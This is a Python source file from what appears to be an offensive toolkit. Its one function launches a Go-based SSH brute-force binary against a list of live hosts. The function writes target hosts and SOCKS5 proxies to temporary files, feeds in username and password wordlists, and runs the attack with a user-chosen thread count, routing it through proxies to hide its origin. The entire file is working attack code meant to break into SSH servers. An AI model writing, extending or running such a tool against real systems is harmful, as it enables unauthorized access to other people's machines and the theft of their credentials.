import subprocess
import os
from globals import global_live_hosts, global_tested_proxies

def run_golang_bruteforce():
    """
    Runs the Go-based SSH brute force attack using tested SOCKS5 proxies.

    This function ensures that valid proxies and host lists exist before execution.
    """
    # Use the existing Golang brute-force binary
    go_bruteforce_binary = "golang_brute"

    if not os.path.exists(go_bruteforce_binary):
        print("[ERROR] Golang brute-force binary not found! Make sure it is in the project directory.")
        return

    if not global_live_hosts:
        print("[ERROR] No valid live hosts found for brute forcing.")
        return

    if not global_tested_proxies:
        print("[WARNING] No tested proxies available. Running without proxy.")

    # Save live hosts to a temporary file for the Golang script to use
    hosts_file = "temp_live_hosts.txt"
    with open(hosts_file, "w") as f:
        for host in global_live_hosts:
            f.write(f"{host}\n")

    # Save proxies to a temporary file (if available)
    proxies_file = "temp_socks5_proxies.txt"
    if global_tested_proxies:
        with open(proxies_file, "w") as f:
            for proxy in global_tested_proxies:
                f.write(f"{proxy[0]}:{proxy[1]}\n")

    # Set default wordlist paths
    username_file = "wordlists/ssh_usernames.txt"
    password_file = "wordlists/ssh_passwords.txt"

    if not os.path.exists(username_file) or not os.path.exists(password_file):
        print("[ERROR] Wordlists not found! Ensure they exist in the wordlists/ directory.")
        return

    # Ask for thread count
    threads = input("Enter the number of threads (default 5): ") or "5"

    try:
        threads = int(threads)
    except ValueError:
        print("[ERROR] Invalid input. Using default (5).")
        threads = 5

    # Construct command to execute Golang brute-force tool
    command = [
        f"./{go_bruteforce_binary}",
        "-hosts", hosts_file,
        "-userlist", username_file,
        "-passlist", password_file,
        "-threads", str(threads)
    ]

    if global_tested_proxies:
        command.extend(["-proxies", proxies_file])

    # Execute the command
    try:
        subprocess.run(command, check=True)
    except subprocess.CalledProcessError as e:
        print(f"[ERROR] Execution failed: {e}")
